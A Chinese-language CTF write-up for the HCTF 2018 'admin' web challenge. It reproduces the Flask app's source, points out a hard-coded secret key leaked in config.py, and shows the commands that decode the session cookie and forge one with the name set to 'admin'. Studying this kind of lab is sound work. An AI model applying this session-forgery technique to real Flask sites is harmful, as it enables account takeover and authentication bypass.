# HCTF 2018【admin】

进来是登录注册，随便注册一个进来，把每个页面简单看一下，在`/change`页面发现提示：
![](assets/Day%204/file-20251221224128176.png)
这个连接已经失效了，在别人的wp里面找到了源码：
```python
#!/usr/bin/env python
# -*- coding:utf-8 -*-
 
from flask import Flask, render_template, url_for, flash, request, redirect, session, make_response
from flask_login import logout_user, LoginManager, current_user, login_user
from app import app, db
from config import Config
from app.models import User
from forms import RegisterForm, LoginForm, NewpasswordForm
from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep
from io import BytesIO
from code import get_verify_code
 
@app.route('/code')
def get_code():
    image, code = get_verify_code()
    # 图片以二进制形式写入
    buf = BytesIO()
    image.save(buf, 'jpeg')
    buf_str = buf.getvalue()
    # 把buf_str作为response返回前端，并设置首部字段
    response = make_response(buf_str)
    response.headers['Content-Type'] = 'image/gif'
    # 将验证码字符串储存在session中
    session['image'] = code
    return response
 
@app.route('/')
@app.route('/index')
def index():
    return render_template('index.html', title = 'hctf')
 
@app.route('/register', methods = ['GET', 'POST'])
def register():
 
    if current_user.is_authenticated:
        return redirect(url_for('index'))
 
    form = RegisterForm()
    if request.method == 'POST':
        name = strlower(form.username.data)
        if session.get('image').lower() != form.verify_code.data.lower():
            flash('Wrong verify code.')
            return render_template('register.html', title = 'register', form=form)
        if User.query.filter_by(username = name).first():
            flash('The username has been registered')
            return redirect(url_for('register'))
        user = User(username=name)
        user.set_password(form.password.data)
        db.session.add(user)
        db.session.commit()
        flash('register successful')
        return redirect(url_for('login'))
    return render_template('register.html', title = 'register', form = form)
 
@app.route('/login', methods = ['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
 
    form = LoginForm()
    if request.method == 'POST':
        name = strlower(form.username.data)
        session['name'] = name
        user = User.query.filter_by(username=name).first()
        if user is None or not user.check_password(form.password.data):
            flash('Invalid username or password')
            return redirect(url_for('login'))
        login_user(user, remember=form.remember_me.data)
        return redirect(url_for('index'))
    return render_template('login.html', title = 'login', form = form)
 
@app.route('/logout')
def logout():
    logout_user()
    return redirect('/index')
 
@app.route('/change', methods = ['GET', 'POST'])
def change():
    if not current_user.is_authenticated:
        return redirect(url_for('login'))
    form = NewpasswordForm()
    if request.method == 'POST':
        name = strlower(session['name'])
        user = User.query.filter_by(username=name).first()
        user.set_password(form.newpassword.data)
        db.session.commit()
        flash('change successful')
        return redirect(url_for('index'))
    return render_template('change.html', title = 'change', form = form)
 
@app.route('/edit', methods = ['GET', 'POST'])
def edit():
    if request.method == 'POST':
         
        flash('post successful')
        return redirect(url_for('index'))
    return render_template('edit.html', title = 'edit')
 
@app.errorhandler(404)
def page_not_found(error):
    title = unicode(error)
    message = error.description
    return render_template('errors.html', title=title, message=message)
 
def strlower(username):
    username = nodeprep.prepare(username)
return username
```
一个flask写的网站。猜测是session伪造。
我们先把session试着揭秘一下：
```powershell
PS D:\webtool\flask-session-cookie-manager> python .\flask_session_cookie_manager3.py decode -c'.eJw9kMuKwkAQRX9lqLWLpJPZCC6UPDBQHRLaaao24iOadNIOREVt8d-ncUBqeS6nbtUT1oexObcwvYzXZgLrbg_TJ3xtYQooqpg1OjYUS123ZDEivQxKtbuRO4aeWEzoXubVtxRLgZo7dNVNitqyojupYWAj_SwsufSBBgMyS0eutqVexSTSAJOfQQrZcjIXbHZOJkVLqnKcp67UaUhm35NqhzLxGbt6oODBd4hLlfndWeszosxxBq8J7M7jYX357ZvT5wROso5zCtAVvVRFh4oE59LrvEiRk2bvqy0G1Bix6gXpKuL57K3r7ObYfEx1VvSb6p-cNtYDCEUEE7iem_H9NQgDeP0BR_9rEw.aUgE_g.I9fmsEi7JKpAhocyhofr8P7NaCE'

#b'{"_fresh":true,"_id":{" b":"M2Q4ZWMzZjY4NWRhYmM3YWI0OTcwYzg1MzZmMDYxOGQ5N2I2MWZiMzQwN2RmZTYxYTllZjNjNjBmYzEyMjM0YjIzYzRmOWU4Y2E0MDVlN2NhZDA2ZjczNDJhYTQzZGEzOWE1YjdkYThlODNhZmUyM2ZlYWI4OTFmMDFhOWE2OGM="},"csrf_token":{" b":"ZDFiZGY0MzJkNTJiMTY2ZGNlODM2ZTYzNjdmYzBlMWM3ZTk2YWQ3ZA=="},"image":{" b":"RFJkaQ=="},"name":"123","user_id":"10"}'

```
这里不知道那里找`secret_key`，看wp原来是源码里面还有一个`config.py`文件里面有key泄露
```python
SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'
```
拿到key之后直接用工具伪造admin的session就好了:
```powershell
PS D:\webtool\flask-session-cookie-manager> python .\flask_session_cookie_manager3.py decode -s 'ckj123' -c '.eJw9kMuKwkAQRX9lqLWLpJPZCC6UPDBQHRLaaao24iOadNIOREVt8d-ncUBqeS6nbtUT1oexObcwvYzXZgLrbg_TJ3xtYQooqpg1OjYUS123ZDEivQxKtbuRO4aeWEzoXubVtxRLgZo7dNVNitqyojupYWAj_SwsufSBBgMyS0eutqVexSTSAJOfQQrZcjIXbHZOJkVLqnKcp67UaUhm35NqhzLxGbt6oODBd4hLlfndWeszosxxBq8J7M7jYX357ZvT5wROso5zCtAVvVRFh4oE59LrvEiRk2bvqy0G1Bix6gXpKuL57K3r7ObYfEx1VvSb6p-cNtYDCEUEE7iem_H9NQgDeP0BR_9rEw.aUgE_g.I9fmsEi7JKpAhocyhofr8P7NaCE'

# {'_fresh': True, '_id': b'3d8ec3f685dabc7ab4970c8536f0618d97b61fb3407dfe61a9ef3c60fc12234b23c4f9e8ca405e7cad06f7342aa43da39a5b7da8e83afe23feab891f01a9a68c', 'csrf_token': b'd1bdf432d52b166dce836e6367fc0e1c7e96ad7d', 'image': b'DRdi', 'name': '123', 'user_id': '10'}

PS D:\webtool\flask-session-cookie-manager> python .\flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'_fresh': True, '_id': b'3d8ec3f685dabc7ab4970c8536f0618d97b61fb3407dfe61a9ef3c60fc12234b23c4f9e8ca405e7cad06f7342aa43da39a5b7da8e83afe23feab891f01a9a68c', 'csrf_token': b'd1bdf432d52b166dce836e6367fc0e1c7e96ad7d', 'image': b'DRdi', 'name': 'admin', 'user_id': '10'}"

# .eJw9kE2LwkAMhv_KkrOHOnYvggelH1jIlJZxh-Qi1VbbaceFqqgj_vcdXJAcn5cnb_KE7WFszi3ML-O1mcC2q2H-hK8dzAFFEbJGx4ZCqcuWLM5Ir4Nc7W_kjlNPLEZ0z9PiW4q1QM0duuImRWlZ0Z3UMLCRflaWXPxAgwGZtSNX2lxvQhJxgNHPIIVsOVoKNnsno6wlVThOY5freEqm7km1Qx75jN08UPDgO4S5SvzupPUZkae4gNcE9ufxsL389s3pcwJHSccpBeiyXqqsQ0WCU-l1XqTISVP7aqsBNc5Y9YJ0MePl4q3rbHVsPqYyyfqq-CenynoAVW27E0zgem7G999gGsDrDzDLbIY.aUgK9w.c7LjfT6NKFseSVv7kVt1VSmMpbc

```
拿到session后访问`/index`即可
![500](assets/Day%204/file-20251221230006763.png)
